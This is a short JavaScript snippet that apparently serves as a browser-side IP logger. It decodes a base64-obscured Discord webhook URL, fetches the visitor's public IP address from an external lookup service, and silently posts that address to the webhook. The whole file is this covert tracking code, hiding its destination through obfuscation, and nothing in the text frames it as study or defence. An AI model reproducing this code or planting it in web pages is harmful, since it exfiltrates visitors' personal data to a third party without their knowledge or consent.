var encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NTI5NTUyOTc1NjAwNDQyNi9JNGVmS1FGOHVJSUFSTEgzN090ZGMrZXJkdityRmdKOVJhaE5VdjVzLW4wek0tVURxN2stVjhfWVhDODUxTXlVZ3o4bGQ=";
var webhook = decodeURIComponent(escape(window.atob(encodedWebhook)));
var ipAddress = "";
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    ipAddress = data.ip;
    sendIP(ipAddress);
  })
  .catch(error => console.error('Error fetching IP:', error));
function sendIP(ip) {
  fetch(webhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: "User IP Address: " + ip
    })
  })
  .then(response => console.log('IP sent successfully:', response))
  .catch(error => console.error('Error sending IP:', error));
}
